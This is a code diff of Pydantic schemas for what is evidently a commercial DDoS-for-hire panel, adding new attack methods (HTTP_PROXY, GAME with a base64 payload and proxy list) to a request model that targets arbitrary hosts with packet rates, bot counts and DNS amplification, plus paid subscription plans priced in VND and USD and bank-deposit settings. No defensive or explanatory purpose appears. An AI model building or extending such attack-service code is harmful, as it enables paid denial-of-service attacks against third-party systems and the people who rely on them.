@@ -90,7 +90,7 @@ class BotThrottle(BaseModel):
 class AttackCreate(BaseModel):
     target_host: str
     target_port: int = Field(..., ge=1, le=65535)
-    method: str = Field(default="MEGA", pattern="^(MEGA|UDP|TLS_EXHAUST|HTTP|SLOWLORIS)$")
+    method: str = Field(default="MEGA", pattern="^(MEGA|UDP|TLS_EXHAUST|HTTP|SLOWLORIS|HTTP_PROXY|GAME)$")
     duration_secs: int = Field(default=60, ge=1, le=3600)
     pps_per_bot: int = Field(default=100000, ge=1, le=100000000)
     bot_count: int = Field(default=1, ge=1, le=100)
@@ -100,6 +100,8 @@ class AttackCreate(BaseModel):
     tls_exhaust: bool = False
     dns_amp: bool = False
     mega_mode: bool = False
+    payload: Optional[str] = None    # base64 game payload for GAME method
+    proxies: Optional[str] = None    # proxy list ip:port, one per line
 
 class AttackOut(BaseModel):
     model_config = ConfigDict(from_attributes=True)
@@ -148,3 +150,72 @@ class PaginatedResponse(BaseModel):
     page: int
     per_page: int
     pages: int
+
+# ── Plan CRUD ──
+class PlanCreate(BaseModel):
+    name: str
+    slug: str
+    description: Optional[str] = None
+    max_bots: int = 1
+    max_concurrent: int = 1
+    max_attack_secs: int = 120
+    cooldown_secs: int = 300
+    max_pps_per_bot: int = 500000
+    allowed_methods: List[str] = ["MEGA","TLS_EXHAUST","HTTP","SLOWLORIS","HTTP_PROXY","GAME","UDP"]
+    price_vnd: int = 10000
+    price_usd: float = 0.5
+    is_active: bool = True
+
+class PlanUpdate(BaseModel):
+    name: Optional[str] = None
+    slug: Optional[str] = None
+    description: Optional[str] = None
+    max_bots: Optional[int] = None
+    max_concurrent: Optional[int] = None
+    max_attack_secs: Optional[int] = None
+    cooldown_secs: Optional[int] = None
+    max_pps_per_bot: Optional[int] = None
+    allowed_methods: Optional[List[str]] = None
+    price_vnd: Optional[int] = None
+    price_usd: Optional[float] = None
+    is_active: Optional[bool] = None
+
+class PlanOut(BaseModel):
+    model_config = ConfigDict(from_attributes=True)
+    id: UUID
+    name: str
+    slug: str
+    description: Optional[str] = None
+    max_bots: int
+    max_concurrent: int
+    max_attack_secs: int
+    cooldown_secs: int
+    max_pps_per_bot: int
+    allowed_methods: List[str]
+    price_vnd: int
+    price_usd: float
+    is_active: bool
+    created_at: Optional[datetime] = None
+
+# ── Site Settings ──
+class SettingsUpdate(BaseModel):
+    site_name: Optional[str] = None
+    site_url: Optional[str] = None
+    telegram_bot_username: Optional[str] = None
+    bank_account_name: Optional[str] = None
+    bank_account_number: Optional[str] = None
+    bank_name: Optional[str] = None
+    bank_bin: Optional[str] = None
+    min_deposit: Optional[int] = None
+    maintenance_mode: Optional[bool] = None
+
+class SettingsOut(BaseModel):
+    site_name: str
+    site_url: str
+    telegram_bot_username: str
+    bank_account_name: str
+    bank_account_number: str
+    bank_name: str
+    bank_bin: str
+    min_deposit: int
+    maintenance_mode: bool
